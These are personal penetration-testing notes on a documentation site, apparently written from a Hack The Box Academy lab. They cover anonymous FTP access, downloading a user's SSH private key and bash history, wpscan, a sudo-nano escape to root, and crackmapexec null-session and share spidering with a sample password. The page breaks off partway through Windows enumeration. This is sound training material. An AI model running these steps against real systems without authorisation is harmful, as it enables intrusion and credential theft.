<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Hacking/HTB Academy/Pentest In a Nutshell" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">Pentest in a nutshell | agalera.eu</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://www.agalera.eu/docs/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://www.agalera.eu/docs/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://www.agalera.eu/docs/Hacking/HTB Academy/Pentest In a Nutshell"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Pentest in a nutshell | agalera.eu"><meta data-rh="true" name="description" content="This should the overall process of a pentesting:"><meta data-rh="true" property="og:description" content="This should the overall process of a pentesting:"><link data-rh="true" rel="canonical" href="https://www.agalera.eu/docs/Hacking/HTB Academy/Pentest In a Nutshell"><link data-rh="true" rel="alternate" href="https://www.agalera.eu/docs/Hacking/HTB Academy/Pentest In a Nutshell" hreflang="en"><link data-rh="true" rel="alternate" href="https://www.agalera.eu/docs/Hacking/HTB Academy/Pentest In a Nutshell" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Pentest in a nutshell","item":"https://www.agalera.eu/docs/Hacking/HTB Academy/Pentest In a Nutshell"}]}</script><link rel="preconnect" href="https://www.google-analytics.com">
<link rel="preconnect" href="https://www.googletagmanager.com">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-S8VGYBN25C"></script>
<script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-S8VGYBN25C",{anonymize_ip:!0})</script><link rel="stylesheet" href="/docs/assets/css/styles.f96ca0f1.css">
<script src="/docs/assets/js/runtime~main.248eae46.js" defer="defer"></script>
<script src="/docs/assets/js/main.c91d5377.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><a class="navbar__brand" href="/docs/"><div class="navbar__logo"><img src="/docs/img/logo.svg" alt="agalera.eu" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/docs/img/logo.svg" alt="agalera.eu" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">agalera.eu</b></a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search"><span aria-label="expand searchbar" role="button" class="search-icon" tabindex="0"></span><input id="search_input_react" type="search" placeholder="Loading..." aria-label="Search" class="navbar__search-input search-bar" disabled=""></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/flight-sim/dcs/f5e">Flight Simulators</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" href="/docs/Hacking/HTB Academy/File inclusion">Hacking</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/Hacking/HTB Academy/File inclusion">HTB Academy</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/File inclusion">File inclusion</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/File transfers">File transfer</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Introduction to Active Directory">Introduction to Active Directory</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Linux fundamentals">Linux fundamentals</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/Hacking/HTB Academy/Pentest In a Nutshell">Pentest in a nutshell</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/SQL injections">SQL injections</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Web fuzzing">Web fuzzing</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Windows fundamentals">Windows fundamentals</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/ffuf">Fuzzing with ffuf</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/languages/bash">Language security</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/playbooks/active-directory">Playbooks</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/tooling/crackmapexec">Tooling</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/useful-links">Useful links</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/write-up/htb/challenges/critical-ops">Write-ups</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/linux-useful-commands">Linux</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/Shortcuts/Chrome">Shortcuts</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/">Welcome</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/docs/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Hacking</span></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">HTB Academy</span></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Pentest in a nutshell</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Pentest in a nutshell</h1></header>
<p>This should the overall process of a pentesting:</p>
<p><img decoding="async" loading="lazy" alt="Pentesting process" src="/docs/assets/images/pt-02a5af6942cfc4a2c3cb7ea20cca17d6.jpg" width="2048" height="771" class="img_ev3q"></p>
<p>Whenever you are blocked in any stage, remember what other stages can be reached from that stage. E.g: you need to do privilege escalation, but you haven&#x27;t found the vulnerability yet.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="linux-information-gathering">Linux information gathering<a href="#linux-information-gathering" class="hash-link" aria-label="Direct link to Linux information gathering" title="Direct link to Linux information gathering">​</a></h2>
<p>If we discover FTP port listening:</p>
<p>Try to log as <code>anonymous</code> user. The FTP service will prompt us for a username and password, which, by default, are anonymous<!-- -->:whatever<!-- -->.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ftp&gt; ls</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">229 Entering Extended Passive Mode (|||47456|)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">150 Opening ASCII mode data connection for file list</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-rw-r--   1 john     john          964 Feb 15 22:14 WordPress_Blog_Setup_Update.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">226 Transfer complete</span><br></span></code></pre></div></div>
<p>Here, we see that there is a file called WordPress_Blog_Setup_Update.txt, which might contains some interesting data for us. We also see that the file is owned by the user john . After we add these findings to our notes, we download the file using the <code>get &lt;filename&gt;</code> command.</p>
<p>Now check the empty files with <code>ls -al</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ftp&gt; ls -al</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">229 Entering Extended Passive Mode (|||42851|)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">150 Opening ASCII mode data connection for file list</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">drwxr-x---   4 john     john         4096 Feb 16 17:28 .</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">drwxr-x---   4 john     john         4096 Feb 16 17:28 ..</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-------   1 john     john         1153 Feb 15 21:13 .bash_history</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-r--r--   1 john     john          220 Jan  6  2022 .bash_logout</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-r--r--   1 john     john         3771 Jan  6  2022 .bashrc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">drwx------   2 john     john         4096 Feb 15 17:16 .cache</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-------   1 john     john           20 Feb 16 16:34 .lesshst</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-r--r--   1 john     john          807 Jan  6  2022 .profile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">drwxrwxr-x   2 john     john         4096 Feb 12 13:55 .ssh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-r--r--   1 john     john            0 Feb 11 10:18 .sudo_as_admin_successful</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-------   1 john     john        17094 Feb 15 22:14 .viminfo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-rw-r--   1 john     john          964 Feb 15 22:14 WordPress_Blog_Setup_Update.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">226 Transfer complete</span><br></span></code></pre></div></div>
<p>Each of these files could contain important information for us, but first we will download the <code>.bash_history</code> file (which can reveal the existence of certain programs, files, directories, access, and more.). By default, Bash saves the last 500-1000 commands in this file, though this number can be configured.</p>
<p>Another potential goldmine is the <code>.ssh</code> directory. This directory (most of the time) is used to store files related to SSH, such as private keys, configs, and more:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ftp&gt; cd .ssh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">250 CWD command successful</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ftp&gt; ls -al</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">229 Entering Extended Passive Mode (|||26184|)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">150 Opening ASCII mode data connection for file list</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-------   1 john     john         2602 Feb 12 13:55 id_rsa</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-r--r--   1 john     john          565 Feb 12 13:55 id_rsa.pub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">226 Transfer complete</span><br></span></code></pre></div></div>
<p>If a wordpress is discovered, we can enumerate more using <code>wpscan</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wpscan --url https://10.129.233.210 --disable-tls-checks</span><br></span></code></pre></div></div>
<p>With the information we have from <code>wpscan</code>, we can use <code>metasplot</code> framework to check if we can get a reverse shell. Also the <code>.bash_history</code> reveales some credentials and we can connect using the <code>id_rsa</code> file using normal SSH.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="linux-system-enumeration">Linux System enumeration<a href="#linux-system-enumeration" class="hash-link" aria-label="Direct link to Linux System enumeration" title="Direct link to Linux System enumeration">​</a></h2>
<p>At this point, we have access to the machine. We are at <code>Post-Exploitation</code> phase:</p>
<p>In the <code>Exploitation</code> stage, we usually do not have any local or privileged access to any of the provided services of the target. However, in the <code>Post-Exploitation</code> stage we do. In other words, <code>Exploitation</code> stage is when we attack the target system from outside and <code>Post-Exploitation</code> when we attack it from within.</p>
<p>In this phase, we need to collect at least the following pieces of information:</p>
<ul>
<li>System Information: OS version, kernel version, architecture, and installed patches</li>
<li>User Information: Current user privileges, all users on the system, sudo rights</li>
<li>Network Information: Network interfaces, routing tables, active connections</li>
<li>Running Services: Active processes, listening ports, scheduled tasks</li>
<li>File System: Interesting files, permissions issues, mounted drives</li>
<li>Installed Software: Applications, versions, potential vulnerabilities</li>
<li>Security Mechanisms: Firewall rules, SELinux status, AppArmor profiles</li>
</ul>
<p>This information can be collected automatically using Linux Privilege Escalation Awesome Script (LinPEAS).</p>
<p>Now, we should analyze the output of linpeas for vulnerabilities for privilege escalation or lateral movement.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="linux-privilege-escalation">Linux Privilege Escalation.<a href="#linux-privilege-escalation" class="hash-link" aria-label="Direct link to Linux Privilege Escalation." title="Direct link to Linux Privilege Escalation.">​</a></h2>
<p>For privilege escalation on a Linux system, we aim to become the root user (aka superuser) on the target system.</p>
<p>Examine the output of <code>sudo -l</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">john@ubuntu:~$ sudo -l</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Matching Defaults entries for john on ubuntu:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User john may run the following commands on ubuntu:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    (root) NOPASSWD: /usr/bin/nano</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    (ALL : ALL) ALL</span><br></span></code></pre></div></div>
<p>John can run <code>/usr/bin/nano</code> as root without typing a password (NOPASSWD), making it extremely convenient to edit system files</p>
<p>He can run any command as any user or group ((ALL : ALL) ALL), effectively granting full administrative privileges, though he must enter his password for all commands except for nano.</p>
<p>Now, we can go to GTFO bins to escape nano and land in a <code>root</code> shell.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="linux-pillaging">Linux pillaging<a href="#linux-pillaging" class="hash-link" aria-label="Direct link to Linux pillaging" title="Direct link to Linux pillaging">​</a></h2>
<p>The term pillaging refers to the process of extracting valuable information from a compromised system for purposes such as privilege escalation, lateral movement, or data exfiltration. Now that we have the highest possible privileges, we can access sensitive files that were previously off-limits.</p>
<p>Now, we can run <code>linpeas</code> as root, to see if it reveals more information that was not previously available. This means that we can find active credentials that are being used by the system. We can get access to <code>root</code> id_rsa key, <code>.bash_history</code>, etc...</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="windows-information-gathering">Windows information gathering<a href="#windows-information-gathering" class="hash-link" aria-label="Direct link to Windows information gathering" title="Direct link to Windows information gathering">​</a></h2>
<p>Very similar to Linux, typically running <code>nmap</code> and enumerate services running in the machine and their versions:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo nmap -p- -sV -sC 10.129.12.20 -T5 -Pn</span><br></span></code></pre></div></div>
<p>If you discover SMB shares, you can use <code>crackmapexec</code> tool or <code>nxc</code> tool to investigate further.</p>
<p>Make sure to try to connect with <code>NULL</code> account, i.e. empty user and password:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">crackmapexec smb 10.129.12.20 -u &#x27;&#x27; -p &#x27;&#x27; --users</span><br></span></code></pre></div></div>
<p>Also, it&#x27;s a good idea to check the <code>Guest</code> account as well:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">crackmapexec smb 10.129.12.20 -u guest -p &#x27;&#x27; --shares</span><br></span></code></pre></div></div>
<p>If it turns out we have valid credentials, we can try to search for file patterns. This is called <code>spidering</code>: <a href="https://www.netexec.wiki/smb-protocol/spidering-shares" target="_blank" rel="noopener noreferrer">https://www.netexec.wiki/smb-protocol/spidering-shares</a></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">crackmapexec smb 10.129.12.20 -u &quot;john&quot; -p &#x27;SuperSecurePass123&#x27; --spider Devs --pattern .</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">crackmapexec smb 10.129.12.20 -u &quot;john&quot; -p &#x27;SuperSecurePass123&#x27; --share Devs --get-file tmp.ps1 tmp.ps1</span><br></span></code></pre></div></div>
<p>It turns out this file reveals a PowerShell script with hardcoded credentials.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="windows-system-enumeration">Windows System Enumeration<a href="#windows-system-enumeration" class="hash-link" aria-label="Direct link to Windows System Enumeration" title="Direct link to Windows System Enumeration">​</a></h2>
<p>Once we have the initial access to the Windows machine, we can enumerate it from inside.</p>
<p>User information</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\Users\john&gt; whoami /priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PRIVILEGES INFORMATION</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">----------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Privilege Name                Description                               State</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============================= ========================================= =======</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SeImpersonatePrivilege        Impersonate a client after authentication Enabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled</span><br></span></code></pre></div></div>
<p>Now, let’s take a look at the groups we are member of.</p>
<div class="language-ps1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ps1 codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\Users\john&gt; whoami /groups</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GROUP INFORMATION</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-----------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Group Name                           Type             SID          Attributes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">==================================== ================ ============ ==================================================</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group</span><br></span><span 